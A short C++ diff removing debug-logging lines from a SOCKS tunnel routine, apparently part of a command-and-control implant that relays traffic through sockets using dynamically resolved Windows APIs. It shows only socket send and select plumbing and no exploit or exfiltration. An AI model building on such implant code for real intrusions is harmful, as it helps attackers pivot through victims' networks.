@@ -1582,7 +1582,6 @@ auto DECLFN Task::Socks(
 			fd_set  Exceptfds  = { 0 };
 			fd_set  Writefds   = { 0 };
 
-			QuickMsg("SOCKS_DBG enter: cid=%lu sz=%lu idx=%d", ChannelID, ChunkSize, (INT)ChannelIndex);
 
 			while ( Self->Krnl32.GetTickCount() < FinishTick ) {
 				Writefds.fd_array[0]  = Self->Tsp->Tunnels[ChannelIndex].Socket;
@@ -1593,7 +1592,6 @@ auto DECLFN Task::Socks(
 				Self->Ws2_32.select( 0, 0, &Writefds, &Exceptfds, &Timeout );
 
 				if ( Self->Ws2_32.__WSAFDIsSet( Self->Tsp->Tunnels[ChannelIndex].Socket, &Exceptfds ) ) {
-					QuickMsg("SOCKS_DBG except: cid=%lu err=%lu", ChannelID, Self->Ws2_32.WSAGetLastError());
 					break;
 				}
 
@@ -1602,14 +1600,12 @@ auto DECLFN Task::Socks(
                     int sendRet = Self->Ws2_32.send(Self->Tsp->Tunnels[ChannelIndex].Socket, (CHAR*)ChunkData, ChunkSize, 0);
                     ULONG sendErr = Self->Ws2_32.WSAGetLastError();
                     if ( sendRet != -1 || sendErr != WSAEWOULDBLOCK ){
-                        QuickMsg("SOCKS_DBG send: ret=%d err=%lu sz=%lu cid=%lu", sendRet, sendErr, ChunkSize, ChannelID);
                         return KhRetSuccess;
                     }
 
 					Self->Krnl32.Sleep(1000);
 				}
 			}
-			QuickMsg("SOCKS_DBG exitloop: cid=%lu", ChannelID);
 			break;
 
         }
